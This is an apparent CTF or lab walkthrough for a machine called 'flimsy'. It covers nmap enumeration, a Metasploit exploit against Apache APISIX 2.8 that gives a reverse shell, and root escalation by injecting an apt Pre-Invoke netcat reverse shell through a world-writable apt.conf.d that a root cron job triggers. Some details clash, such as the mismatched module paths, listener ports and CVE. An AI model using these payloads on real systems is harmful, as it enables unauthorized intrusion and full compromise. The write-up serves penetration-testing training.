## Summary:

In this guide, we will take advantage of an RCE in `Apache Apisix 2.8` to gain an intial foothold before escalating privleges via a cronjob running the `apt package manager`.

## Enumeration

We start the enumeration process with an `nmap` scan:

```
┌──(kali㉿kali)-[~]
└─$ sudo nmap 172.16.201.19 -p- -sVC
Starting Nmap 7.92 ( https://nmap.org ) at 2022-07-28 12:05 EDT
Nmap scan report for flimsy.com (172.16.201.19)
Host is up (0.048s latency).
Not shown: 65327 filtered tcp ports (no-response), 203 filtered tcp ports (host-prohibited)
PORT      STATE  SERVICE    VERSION
22/tcp    open   ssh        OpenSSH 8.2p1 Ubuntu 4ubuntu0.5 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   3072 62:36:1a:5c:d3:e3:7b:e1:70:f8:a3:b3:1c:4c:24:38 (RSA)
|   256 ee:25:fc:23:66:05:c0:c1:ec:47:c6:bb:00:c7:4f:53 (ECDSA)
|_  256 83:5c:51:ac:32:e5:3a:21:7c:f6:c2:cd:93:68:58:d8 (ED25519)
80/tcp    open   http       nginx 1.18.0 (Ubuntu)
|_http-title: Upright
|_http-server-header: nginx/1.18.0 (Ubuntu)
3306/tcp  open   mysql      MySQL (unauthorized)
8080/tcp  closed http-proxy
43500/tcp open   http       OpenResty web app server
|_http-title: Site doesn't have a title (text/plain; charset=utf-8).
|_http-server-header: APISIX/2.8
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
```

We begin by adding `flimsy.com` to our `/etc/hosts` file.

```
┌──(kali㉿kali)-[~]
└─$ cat /etc/hosts
127.0.0.1       localhost
127.0.1.1       kali
...
172.16.201.19 flimsy.com
```

On port `43500` we see that the `OpenResty web app server` is running.

Visiting `http://172.16.201.19:43500` we see the following `JSON` error message.

```
┌──(kali㉿kali)-[~]
└─$ curl http://172.16.201.19:43500 
{"error_msg":"404 Route Not Found"}
```

After researching the `{"error_msg":"404 Route Not Found"` error message we see that the webserver is using an `Apache Apisix` API Gateway.

In order to determine the `Apache Apisix` version we use `curl` with the `-I` option to fetch the headers only.

```
┌──(kali㉿kali)-[~]
└─$ curl -I  http://172.16.201.19:43500

HTTP/1.1 404 Not Found
Date: Thu, 28 Jul 2022 07:26:11 GMT
Content-Type: text/plain; charset=utf-8
Connection: keep-alive
Server: APISIX/2.8
```

After Googling for any known vulnerabilities for `Apache Apisix 2.8` we came across `(CVE-2022-24112)` which allows an attacker to target the `batch-requests` plugin to bypass the IP restriction set on the Admin API.

https://www.exploit-db.com/exploits/50829

## Exploitation

We can use `metasploit` to exploit this vulnerability, searching for `apisix`.

```
┌──(kali㉿kali)-[~]
└─$ msfconsole -q                                     
msf6 > search apisix

Matching Modules
================

   #  Name                                                    Disclosure Date  Rank       Check  Description
   -  ----                                                    ---------------  ----       -----  -----------
   0  exploit/multi/http/apache_apisix_api_default_token_rce  2020-12-07       excellent  Yes    APISIX Admin API default access token RCE

...........
```

Now we set the following options to launch our attack:

```
use exploit/http/apache_apisix
set payload cmd/unix/reverse_bash
set rhosts flimsy.com
set rport 43500
set lhost 192.168.118.4
set targeturi /apisix
exploit
```

Confirming that our options are properly set

```
msf6 exploit(multi/http/apache_apisix_api_default_token_rce) > options

Module options (exploit/multi/http/apache_apisix_api_default_token_rce):

   Name        Current Setting                   Required  Description
   ----        ---------------                   --------  -----------
   ALLOWED_IP  127.0.0.1                         yes       IP in the allowed list
   API_KEY     edd1c9f034335f136f87ad84b625c8f1  yes       Admin API KEY (Default: edd1c9f034335f136f87ad84b625c8f1)
   Proxies                                       no        A proxy chain of format type:host:port[,type:host:port][...]
   RHOSTS      flimsy.com                        yes       The target host(s), see https://github.com/rapid7/metasploit-framework/wiki/Using-Metasploit
   RPORT       43500                             yes       The target port (TCP)
   SSL         false                             no        Negotiate SSL/TLS for outgoing connections
   TARGETURI   /apisix                           yes       Path to the APISIX DocumentRoot
   VHOST                                         no        HTTP server virtual host


Payload options (cmd/unix/reverse_bash):

   Name   Current Setting  Required  Description
   ----   ---------------  --------  -----------
   LHOST  tun00             yes       The listen address (an interface may be specified)
   LPORT  4444              yes       The listen port


Exploit target:

   Id  Name
   --  ----
   0   Automatic
```

Now we execute the exploit and receive a reverse shell as the user `franklin`.

```
msf6 exploit(http/apache_apisix) > exploit

[*] Started reverse TCP handler on 192.168.118.4:4444 
[*] Running automatic check ("set AutoCheck false" to disable)
[*] Checking component version to 172.16.201.19:43500
[+] The target appears to be vulnerable.
[*] Command shell session 1 opened ...

whoami

franklin
```

## Privilege Escalation

During our enumeration we check the contents of `/etc/crontab` and find a `cronjob` running.

```
cat /etc/crontab

SHELL=/bin/bash
PATH=/sbin:/bin:/usr/sbin:/usr/bin
MAILTO=root

# For details see man 4 crontabs

# Example of job definition:
# .---------------- minute (0 - 59)
# |  .------------- hour (0 - 23)
# |  |  .---------- day of month (1 - 31)
# |  |  |  .------- month (1 - 12) OR jan,feb,mar,apr ...
# |  |  |  |  .---- day of week (0 - 6) (Sunday=0 or 7) OR sun,mon,tue,wed,thu,fri,sat
# |  |  |  |  |
# *  *  *  *  * user-name  command to be executed 

* * * * * root apt-get update
* * * * * root /root/run.sh

```

As the service runs as `root` we can execute malicious commands via the `apt package manager`.

We begin by checking the writable permissions on `/etc/apt/apt.conf.d`:

```
ls -ld /etc/apt/apt.conf.d
-rwxrwxrwx. 1 root root 1338 Apr 28 13:45 /etc/apt/apt.conf.d
bash-4.2$
```

https://www.hackingarticles.in/linux-for-pentester-apt-privilege-escalation/

Now we insert a `bash` reverse shell payload inside `apt.conf.d`:

```
echo 'apt::Update::Pre-Invoke {"rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc <My-IP> 1234 >/tmp/f"};' > shell
```

Next, we start a listener on our attack machine.

```
┌──(kali㉿kali)-[~]
└─$ sudo nc -lvnp 445 
listening on [any] 445 ...
```

After waiting for a minute we get a shell as `root`.

```
┌──(kali㉿kali)-[~]
└─$ sudo nc -lvnp 445 
listening on [any] 445
connect to [192.168.118.4] from (UNKNOWN) [172.16.201.19] 47052
...
whoami
whoami
root
```